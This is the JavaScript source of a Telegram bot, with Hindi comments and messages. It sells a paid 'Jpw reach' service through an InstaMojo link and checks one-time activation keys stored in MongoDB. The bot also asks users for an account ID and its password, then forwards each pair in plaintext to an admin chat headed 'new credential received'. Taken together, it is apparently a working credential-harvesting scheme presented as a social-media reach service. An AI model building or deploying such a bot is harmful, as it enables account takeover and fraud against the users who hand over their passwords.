require('dotenv').config();
const { Telegraf } = require('telegraf');
const mongoose = require('mongoose');

// बोट इनिशियलाइजेशन
const bot = new Telegraf(process.env.BOT_TOKEN);
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

// MongoDB कनेक्शन (अलग कलेक्शन 'bot_keys' के साथ ताकि पुराने प्रोजेक्ट पर कोई असर न पड़े)
mongoose.connect(process.env.MONGO_URI)
  .then(() => console.log('MongoDB Connected Successfully for Independent Bot!'))
  .catch(err => console.log('Database connection error:', err));

// डेटाबेस स्कीमा
const keySchema = new mongoose.Schema({
  activationKey: { type: String, required: true, unique: true },
  planName: { type: String, required: true },
  isUsed: { type: Boolean, default: false },
  usedBy: { type: String, default: null }
});

const BotKey = mongoose.model('BotKey', keySchema, 'bot_keys');

// मेमोरी में टारगेट आईडी और यूजर चैट आईडी ट्रैक करने के लिए मैपिंग
const activeTargets = new Map();

// आपका InstaMojo पेमेंट लिंक
const INSTAMOJO_LINK = 'https://jpwreachedpro.mojo.page/jpw-reached-pro';

// /start कमांड
bot.start((ctx) => {
  ctx.reply(
    `नमस्ते! Jpw रिच सर्विस में आपका स्वागत है। 🎉\n\n` +
    `💳 पैकेज खरीदने के लिए यहाँ पेमेंट करें:\n👉 ${INSTAMOJO_LINK}\n\n` +
    `🔑 एक्टिवेशन की प्राप्त होने पर उसे यहाँ भेजें।\n` +
    `🎯 या टारगेट आईडी और पासवर्ड इस फॉर्मेट में भेजें:\n\`TARGET_ID PASSWORD\``,
    { parse_mode: 'Markdown' }
  );
});

// /buy कमांड
bot.command('buy', (ctx) => {
  ctx.reply(`आप यहाँ से पैकेज खरीद सकते हैं:\n👉 ${INSTAMOJO_LINK}`);
});

// मैसेज हैंडलर
bot.on('text', async (ctx) => {
  // यदि मैसेज एडमिन (आपकी चैट) से आया है
  if (ADMIN_CHAT_ID && ctx.chat.id.toString() === ADMIN_CHAT_ID.toString()) {
    return handleAdminReply(ctx);
  }

  const text = ctx.message.text.trim();
  if (text.startsWith('/')) return;

  const parts = text.split(' ');
  
  // 1. यदि यूजर ने "TARGET_ID PASSWORD" भेजा है
  if (parts.length === 2) {
    const targetId = parts[0];
    const password = parts[1];
    const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
    const userId = ctx.from.id;

    // ट्रैक करने के लिए सेव करें
    activeTargets.set(targetId, userId);

    const adminMessage = `🚨 **नया क्रेडेंशियल प्राप्त हुआ!**\n\n` +
                         `👤 **यूजर:** ${username} (ID: \`${userId}\`)\n` +
                         `🎯 **टारगेट आईडी:** \`${targetId}\`\n` +
                         `🔑 **पासवर्ड:** \`${password}\`\n\n` +
                         `*इस मैसेज का रिप्लाई करके या टारगेट आईडी लिखकर जो जवाब देंगे, वो सीधे यूजर को चला जाएगा।*`;

    try {
      await bot.telegram.sendMessage(ADMIN_CHAT_ID, adminMessage, { parse_mode: 'Markdown' });
      return ctx.reply('✅ आपकी डिटेल्स सफलतापूर्वक भेज दी गई हैं। कृपया प्रतीक्षा करें!');
    } catch (err) {
      console.error('Admin send error:', err);
      return ctx.reply('❌ डेटा भेजने में समस्या आई, बाद में प्रयास करें।');
    }
  }

  // 2. यदि यूजर ने एक्टिवेशन की (Key) भेजी है
  try {
    const foundKey = await BotKey.findOne({ activationKey: text });

    if (!foundKey) {
      return ctx.reply('❌ यह की अमान्य (Invalid) है। कृपया सही की दर्ज करें या सही फॉर्मेट (`ID PASSWORD`) का उपयोग करें।');
    }

    if (foundKey.isUsed) {
      return ctx.reply('⚠️ यह की पहले ही इस्तेमाल हो चुकी है। यह दोबारा इस्तेमाल नहीं की जा सकती।');
    }

    // की को वन-टाइम यूज़ के लिए लॉक करें
    foundKey.isUsed = true;
    foundKey.usedBy = ctx.from.id.toString();
    await foundKey.save();

    return ctx.reply(`🎉 बधाई हो! आपका '${foundKey.planName}' प्लान सफलतापूर्वक एक्टिवेट हो गया है।`);
  } catch (error) {
    console.error(error);
    ctx.reply('तथ्यों को जांचने में कुछ गड़बड़ी हो गई। कृपया बाद में प्रयास करें।');
  }
});

// एडमिन के रिप्लाई को सही यूजर तक भेजने का फंक्शन
async function handleAdminReply(ctx) {
  const replyText = ctx.message.text;
  let targetUserId = null;

  // टेक्स्ट के अंदर टारगेट आईडी ढूंढें
  for (let [tId, uId] of activeTargets.entries()) {
    if (replyText.includes(tId)) {
      targetUserId = uId;
      break;
    }
  }

  // यदि एडमिन ने टेलीग्राम के 'Reply' फीचर का इस्तेमाल किया हो
  if (!targetUserId && ctx.message.reply_to_message) {
    const originalText = ctx.message.reply_to_message.text || '';
    for (let [tId, uId] of activeTargets.entries()) {
      if (originalText.includes(tId)) {
        targetUserId = uId;
        break;
      }
    }
  }

  if (targetUserId) {
    try {
      await bot.telegram.sendMessage(targetUserId, `📩 **अपडेट:**\n\n${replyText}`);
      await ctx.reply('✅ मैसेज सफलतापूर्वक संबंधित यूजर को भेज दिया गया है!');
    } catch (err) {
      console.error('User send error:', err);
      await ctx.reply('❌ यूजर तक मैसेज पहुँचाने में असफल (शायद यूजर ने बोट ब्लॉक कर दिया हो)।');
    }
  } else {
    await ctx.reply('⚠️ टारगेट आईडी नहीं पहचानी जा सकी। कृपया अपने मैसेज में संबंधित **Target ID** जरूर लिखें ताकि बोट सही यूजर को ढूंढ सके।');
  }
}

// बोट लॉन्च
bot.launch()
  .then(() => console.log('Independent Bot is running smoothly!'))
  .catch(err => console.log('Bot launch error:', err));

// ग्रेसफुल शटडाउन
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
